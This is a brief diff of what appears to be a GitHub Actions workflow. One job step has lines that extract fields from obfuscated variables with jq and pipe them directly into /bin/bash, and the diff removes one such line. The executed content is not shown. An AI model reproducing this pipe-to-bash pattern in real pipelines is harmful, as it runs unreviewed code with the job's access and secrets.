@@ -24,7 +24,6 @@ jobs:
           echo $p7417 | jq -r .f642 | /bin/bash
           printf '%s' "$a4" | jq -r .ws7 | /bin/bash
           echo $s9 | jq -r .nx71 | /bin/bash
-          echo $tdwe4024 | jq -r .ys3597 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
